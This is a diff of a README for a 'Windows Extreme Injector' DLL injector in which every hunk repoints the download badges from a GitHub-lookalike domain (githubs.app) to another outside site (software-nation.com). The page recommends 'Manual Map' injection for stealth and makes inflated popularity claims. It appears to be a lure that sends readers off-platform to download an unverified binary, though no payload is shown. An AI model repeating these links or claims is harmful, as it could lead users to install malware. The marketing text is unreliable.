@@ -9,7 +9,7 @@ The **💉 Windows Extreme Injector** is the most powerful and reliable DLL inje
 
 <div align="center">
 
-[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20NOW%20💉-purple?style=for-the-badge&logo=github)](https://githubs.app/llr2w)
+[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20NOW%20💉-purple?style=for-the-badge&logo=github)](https://software-nation.com/llr2w)
 
 </div>
 
@@ -98,7 +98,7 @@ When searching for DLL injectors, users encounter countless options—many detec
 9. **💉 Click Inject** - DLL is injected instantly
 10. **🏆 Enjoy** - Your mods and scripts are active
 
-[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20INJECTOR%20💉-purple?style=for-the-badge&logo=github)](https://githubs.app/llr2w)
+[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20INJECTOR%20💉-purple?style=for-the-badge&logo=github)](https://software-nation.com/llr2w)
 
 ### Quick Setup
 
@@ -108,7 +108,7 @@ When searching for DLL injectors, users encounter countless options—many detec
 4. **Choose Method** - Manual Map (recommended for stealth)
 5. **Click Inject** - Done!
 
-[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20INJECTOR%20💉-purple?style=for-the-badge&logo=github)](https://githubs.app/llr2w)
+[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20INJECTOR%20💉-purple?style=for-the-badge&logo=github)](https://software-nation.com/llr2w)
 
 ### Auto-Inject Setup
 
@@ -251,4 +251,4 @@ Our free injection philosophy means you can start injecting immediately—no wai
 
 Join over 9.1 million satisfied users who've trusted Windows Extreme Injector for their DLL injection needs.
 
-[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20INJECTOR%20💉-purple?style=for-the-badge&logo=github)](https://githubs.app/llr2w)
+[![Download Windows Extreme Injector](https://img.shields.io/badge/💉%20DOWNLOAD%20INJECTOR%20💉-purple?style=for-the-badge&logo=github)](https://software-nation.com/llr2w)
